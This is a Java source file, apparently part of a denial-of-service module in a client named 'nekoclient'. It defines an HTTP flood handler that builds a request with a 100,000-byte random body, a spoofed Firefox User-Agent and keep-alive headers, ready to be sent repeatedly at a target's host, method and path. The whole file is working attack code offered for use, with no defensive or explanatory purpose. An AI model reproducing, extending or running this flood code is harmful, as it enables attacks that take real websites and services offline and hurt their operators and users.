package dev.neko.nekoclient.api.ddos.impl.handler.impl.http;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.BufferWritingMethodHandler;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.util.Objects;
import java.util.Random;

public class HttpBodyMethod extends BufferWritingMethodHandler {
   @Override
   public void init(Protocol protocol, InetSocketAddress address, String originalHost, JsonObject options) throws IOException {
      byte[] content = new byte[100000];
      new Random().nextBytes(content);
      String host = options.getString("host", originalHost);
      String method = options.getString("method", "GET");
      String path = options.getString("path", "/");
      String contentType = options.getString("contentType", null);
      String accept = options.getString("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
      String userAgent = options.getString("userAgent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
      StringBuilder request = new StringBuilder()
         .append(method)
         .append(" ")
         .append(path)
         .append(" ")
         .append("HTTP/1.1")
         .append("\r\n")
         .append("Accept: ")
         .append(accept)
         .append("\r\n")
         .append("Accept-Language: en-US,en;q=0.5")
         .append("\r\n")
         .append("User-Agent: ")
         .append(userAgent)
         .append("\r\n")
         .append("Connection: keep-alive")
         .append("\r\n")
         .append("Content-Length: ")
         .append(content.length)
         .append("\r\n")
         .append("Host: ")
         .append(host)
         .append("\r\n");
      if (Objects.nonNull(contentType)) {
         request.append("Content-Type: ").append(contentType).append("\r\n");
      }

      request.append("\r\n");
      byte[] requestBytes = request.toString().getBytes();
      this.buffer = ByteBuffer.allocate(requestBytes.length + content.length);
      this.buffer.put(requestBytes);
      this.buffer.put(content);
      ((Buffer)this.buffer).flip();
   }
}
